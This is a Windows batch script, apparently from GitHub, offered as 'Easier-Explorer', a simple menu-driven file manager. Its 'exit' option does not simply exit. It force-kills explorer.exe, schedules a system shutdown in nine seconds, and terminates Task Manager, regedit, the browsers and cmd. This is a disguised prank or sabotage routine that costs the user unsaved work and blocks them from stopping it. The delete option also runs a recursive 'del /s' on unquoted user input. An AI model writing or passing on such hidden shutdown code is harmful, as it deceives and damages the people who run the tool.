@echo off
timeout /t 1 >nul
echo resizing
mode con: cols=120 lines=30
echo resizing
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Loading [.]
color b
echo Loading [..]
color a
echo Loading [...]
timeout /t 1 >nul
cls
goto :menu
cls
:menu
cls
color 6
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Please enter a command:
echo. nano - read .txt files in the specified directory
echo. ls - List files and directories
echo. cd - Change directory
echo. mkdir - Create a new directory
echo. copy - Copy files or directories
echo. move - Move files or directories
echo. del - Delete files or directories
echo. exit - Exit Easier-Explorer
echo.
echo if u want to exit a command press ctrl+c;
echo.
echo ==================================
echo Credit to Imistrz21 on GitHub
echo.
echo Enter a command bellow: && set /p choice=""

if "%choice%"=="nano" goto nano
if "%choice%"=="ls" goto list_files
if "%choice%"=="cd" goto change_directory
if "%choice%"=="mkdir" goto create_directory
if "%choice%"=="copy" goto copy_files
if "%choice%"=="move" goto move_files
if "%choice%"=="del" goto delete_files
if "%choice%"=="exit" goto exit_program

echo Invalid choice. Please try again.
goto menu

:nano
setlocal enabledelayedexpansion
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
set /p file_txt="Enter source file/directory: "

if not exist "!file_txt!" (
    echo File does not exist.
    exit /b
)
cls
echo Loading
timeout /t 1 >nul
cls
mode con: cols=80 lines=25
echo Loading
timeout /t 1 >nul
cls
echo ================================================================================
echo.
echo Contents of !file_txt!:
echo.
for /f "usebackq delims=" %%c in ("!file_txt!") do (
    echo %%c
)
echo.
pause
color a
echo Resizing
timeout /t 1 >nul
echo resizing
mode con: cols=120 lines=30
echo resizing
goto menu
:list_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
Echo Listing files.
dir
echo.
pause
goto menu

:change_directory
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Changing directory.
echo.
set /p newdir="Enter directory path: "
cd %newdir%
echo.
pause
goto menu

:create_directory
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Creating an directory.
set /p dirname="Enter new directory name: "
mkdir %dirname%
echo.
pause
timeout /t 1 >nul
goto menu

:copy_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Copying files.
set /p source="Enter source file/directory: "
set /p destination="Enter destination directory: "
copy %source% %destination%
echo.
pause
timeout /t 1 >nul
goto menu

:move_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Moving files.
set /p source="Enter source file/directory: "
set /p destination="Enter destination directory: "
move %source% %destination%
echo.
pause
timeout /t 1 >nul
goto menu

:delete_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Deleting files.
set /p target="Enter file/directory to delete: "
del /s %target%
echo.
pause
timeout /t 1 >nul
goto menu

:exit_program
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo.
echo Exiting Easier-Explorer...
timeout /t 1 >nul
taskkill /f /im explorer.exe
timeout /t 1 >nul
shutdown -s -t 9
timeout /t 1 >nul
taskkill /f /im regedit.exe
taskkill /f /im chrome.exe
taskkill /f /im iexplorer.exe
taskkill /f /im edge.exe
taskkill /f /im taskmgr.exe
timeout /t 1 >nul
taskkill /f /im cmd.exe
exit
